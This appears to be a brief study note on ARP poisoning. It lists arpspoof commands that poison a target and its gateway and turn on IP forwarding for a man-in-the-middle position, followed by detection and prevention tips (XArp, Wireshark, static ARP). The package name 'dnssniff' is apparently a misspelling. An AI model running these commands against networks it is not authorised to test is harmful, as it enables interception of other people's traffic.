---
title: ARP Poisoning
date: 2024-01-28 14:15:56 -0600
updated: 2024-01-30 20:47:48 -0600
---

````bash
sudo apt install dnssniff

arpspoof -i <interface> -t <target-ip> <router-ip>
arpspoof -i <interface> -t <gateway-ip> <target-ip>
````

The target device will not have access to the internet after running the above commands  
Our device is not an router and does not forward incoming packets  

We need to unable Port Forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward`

### Prevention

#### ARP Poisoning
Manually check the ARP table for duplicate MAC Addresses  
**Xarp**: Application used to automatically detect ARP poisoning

#### Detect ARP Storm
Wireshark - Protocol - ARP - Detect ARP Request Storm  
Analyze - Expert Information  
Alternate approach is to define Static ARP
